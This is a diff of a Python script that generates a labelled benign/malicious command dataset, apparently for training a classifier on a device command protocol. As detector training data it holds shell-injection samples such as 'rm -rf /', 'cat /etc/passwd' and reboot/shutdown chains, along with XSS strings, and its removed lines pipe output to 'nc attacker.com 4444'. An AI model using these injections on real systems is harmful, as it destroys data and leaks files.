@@ -1,134 +1,180 @@
-# generate_malicious_only.py
-# 只負責產生「惡意 / 格式錯誤 payload」，不依賴舊 dataset
-
+# build_dataset_all_in_one.py
 import csv
 import random
+import os
+from sklearn.model_selection import train_test_split
 
-OUT_PATH = "malicious_only.csv"
-N_PER_TYPE = 400  # 每一種型態要幾筆，可以自己調
+# ====== 可自行調整的數量參數 ======
+N_BENIGN_MATH = 40000
+N_BENIGN_ECHO = 30000
+N_BENIGN_PLAIN_ECHO = 30000
+N_BENIGN_TEMP = 20000
 
-# --------- 產生各種壞 payload ---------
+N_BAD_PER_TYPE = 12000   # 每一種惡意型態的數量
 
-def gen_bad_run_cmd_add_sub():
-    """run_cmd, ADD / SUB：參數錯誤 & op 拼錯"""
+TRAIN_RATIO = 0.8
+SEED = 42
+OUT_DIR = "dataset"
+
+random.seed(SEED)
+
+# ==============================
+# 良性資料
+# ==============================
+def gen_benign():
     rows = []
 
-    # 1) ADD / SUB 參數個數錯誤（3 個數字）
-    for _ in range(N_PER_TYPE):
-        a = random.randint(-100, 100)
-        b = random.randint(-100, 100)
-        c = random.randint(-100, 100)
-        rows.append([f"run_cmd, ADD {a} {b} {c}", "malicious", "cmd_parse_error"])
+    # run_cmd ADD / SUB
+    for _ in range(N_BENIGN_MATH):
+        a = random.randint(-1000, 1000)
+        b = random.randint(-1000, 1000)
+        op = random.choice(["ADD", "SUB"])
+        rows.append([f"run_cmd,{op} {a} {b}", "benign", "math"])
 
-    for _ in range(N_PER_TYPE):
-        a = random.randint(-100, 100)
-        b = random.randint(-100, 100)
-        c = random.randint(-100, 100)
-        rows.append([f"run_cmd, SUB {a} {b} {c}", "malicious", "cmd_parse_error"])
+    # run_cmd echo
+    texts = [
+        "hello world",
+        "device ready",
+        "system ok",
+        "temperature normal",
+        "abc123",
+        "done"
+    ]
+    for _ in range(N_BENIGN_ECHO):
+        t = random.choice(texts)
+        rows.append([f"run_cmd,echo {t}", "benign", "echo"])
 
-    # 2) 非整數參數
+    # echo,
+    for _ in range(N_BENIGN_PLAIN_ECHO):
+        t = random.choice(texts)
+        rows.append([f"echo,{t}", "benign", "echo"])
+
+    # start_temp_report
+    for _ in range(N_BENIGN_TEMP):
+        v = random.choice(["1", "5", "10", "60", "abc", "xyz"])
+        rows.append([f"start_temp_report,{v}", "benign", "temp"])
+
+    return rows
+
+
+# ==============================
+# 惡性資料
+# ==============================
+def gen_bad_run_cmd_add_sub():
+    rows = []
+
+    # 參數數量錯
+    for _ in range(N_BAD_PER_TYPE):
+        a, b, c = random.randint(-100, 100), random.randint(-100, 100), random.randint(-100, 100)
+        rows.append([f"run_cmd,ADD {a} {b} {c}", "malicious", "cmd_parse_error"])
+        rows.append([f"run_cmd,SUB {a} {b} {c}", "malicious", "cmd_parse_error"])
+
+    # 非整數
     bad_tokens = ["X", "abc", "1.5", "NaN"]
-    for _ in range(N_PER_TYPE):
+    for _ in range(N_BAD_PER_TYPE):
         a = random.randint(-100, 100)
         x = random.choice(bad_tokens)
-        rows.append([f"run_cmd, ADD {a} {x}", "malicious", "cmd_parse_error"])
+        rows.append([f"run_cmd,ADD {a} {x}", "malicious", "cmd_parse_error"])
+        rows.append([f"run_cmd,SUB {a} {x}", "malicious", "cmd_parse_error"])
 
-    for _ in range(N_PER_TYPE):
-        a = random.randint(-100, 100)
-        x = random.choice(bad_tokens)
-        rows.append([f"run_cmd, SUB {a} {x}", "malicious", "cmd_parse_error"])
-
-    # 3) 拼錯 op：特別加上 AD、SU
+    # op 拼錯
     wrong_ops = ["AD", "SU", "ADDd", "PLUS", "SUM", "SUBB"]
-    for _ in range(N_PER_TYPE):
-        a = random.randint(-100, 100)
-        b = random.randint(-100, 100)
+    for _ in range(N_BAD_PER_TYPE):
+        a, b = random.randint(-100, 100), random.randint(-100, 100)
         op = random.choice(wrong_ops)
-        rows.append([f"run_cmd, {op} {a} {b}", "malicious", "cmd_parse_error"])
+        rows.append([f"run_cmd,{op} {a} {b}", "malicious", "cmd_parse_error"])
 
     return rows
 
 
 def gen_bad_run_cmd_echo():
-    """run_cmd, echo 後面帶 shell injection"""
     rows = []
-    inj_patterns = [
+    inj = [
         "hello; rm -rf /",
         "status | cat /etc/passwd",
         "ping 8.8.8.8 && reboot",
-        "check $HOME > /tmp/leak",
         "user `whoami`",
-        "ls > out.txt && cat out.txt",
-        "sensor | nc attacker.com 4444",
         "ok && echo hacked",
     ]
-    for _ in range(N_PER_TYPE):
-        p = random.choice(inj_patterns)
-        rows.append([f"run_cmd, echo {p}", "malicious", "cmdi"])
+    for _ in range(N_BAD_PER_TYPE):
+        p = random.choice(inj)
+        rows.append([f"run_cmd,echo {p}", "malicious", "cmdi"])
     return rows
 
 
 def gen_bad_echo():
-    """echo, ... 惡意（帶 shell 字元或 XSS）"""
     rows = []
-    inj_patterns = [
-        "hello; rm -rf /",
+    inj = [
         "hi && shutdown now",
-        "test | nc attacker.com 4444",
-        "<script>alert('XSS')</script>",
+        "<script>alert(1)</script>",
         "<img src=x onerror=alert(1)>",
         "name=$USER; id",
-        "ok `whoami` && id",
         "value > /tmp/leak",
     ]
-    for _ in range(N_PER_TYPE):
-        p = random.choice(inj_patterns)
-        rows.append([f"echo, {p}", "malicious", "cmdi"])
+    for _ in range(N_BAD_PER_TYPE):
+        p = random.choice(inj)
+        rows.append([f"echo,{p}", "malicious", "cmdi"])
     return rows
 
 
 def gen_bad_start_temp_report():
-    """start_temp_report 參數不是合法正整數"""
     rows = []
-    bad_vals = ["abc", "1.5", "-3.2", "NaN", "five", "0", "-1"]
-    for _ in range(N_PER_TYPE):
+    bad_vals = ["abc", "1.5", "-3", "NaN", "0", "-1"]
+    for _ in range(N_BAD_PER_TYPE):
         v = random.choice(bad_vals)
-        rows.append([f"start_temp_report, {v}", "malicious", "temp_report_error"])
+        rows.append([f"start_temp_report,{v}", "malicious", "temp_error"])
     return rows
 
 
 def gen_bad_misspelled_cmd():
-    """像 run, ech, eco 這種拼錯指令（也是格式錯誤）"""
     rows = []
-    for _ in range(N_PER_TYPE):
-        a = random.randint(-50, 50)
-        b = random.randint(-50, 50)
-        cmd = random.choice(["run", "rn_cmd", "ech", "eco", "runcmd"])
-        if cmd.lower().startswith("ech"):  # ech, hello world
-            rows.append([f"{cmd}, hello world", "malicious", "cmd_parse_error"])
-        else:
-            rows.append([f"{cmd}, ADD {a} {b}", "malicious", "cmd_parse_error"])
+    cmds = ["run", "rn_cmd", "ech", "eco", "runcmd"]
+    for _ in range(N_BAD_PER_TYPE):
+        a, b = random.randint(-50, 50), random.randint(-50, 50)
+        c = random.choice(cmds)
+        rows.append([f"{c},ADD {a} {b}", "malicious", "cmd_parse_error"])
     return rows
 
 
-# --------- 主程式：只輸出惡意 rows ---------
-
-def main():
+def gen_malicious():
     rows = []
     rows += gen_bad_run_cmd_add_sub()
     rows += gen_bad_run_cmd_echo()
     rows += gen_bad_echo()
     rows += gen_bad_start_temp_report()
     rows += gen_bad_misspelled_cmd()
+    return rows
 
-    print(f"[info] total generated malicious rows: {len(rows)}")
 
-    with open(OUT_PATH, "w", encoding="utf-8", newline="") as f:
-        w = csv.writer(f)
-        w.writerow(["payload", "label", "attack_type"])
-        w.writerows(rows)
+# ==============================
+# 主流程
+# ==============================
+def main():
+    benign = gen_benign()
+    malicious = gen_malicious()
 
-    print(f"[ok] wrote {OUT_PATH}")
+    print(f"[info] benign: {len(benign)}")
+    print(f"[info] malicious: {len(malicious)}")
+
+    all_rows = benign + malicious
+    random.shuffle(all_rows)
+
+    train, test = train_test_split(
+        all_rows,
+        train_size=TRAIN_RATIO,
+        random_state=SEED,
+        stratify=[r[1] for r in all_rows],
+    )
+
+    os.makedirs(OUT_DIR, exist_ok=True)
+
+    for name, rows in [("train", train), ("test", test)]:
+        path = f"{OUT_DIR}/{name}.csv"
+        with open(path, "w", encoding="utf-8", newline="") as f:
+            w = csv.writer(f)
+            w.writerow(["payload", "label", "type"])
+            w.writerows(rows)
+        print(f"[ok] wrote {path} ({len(rows)})")
 
 
 if __name__ == "__main__":
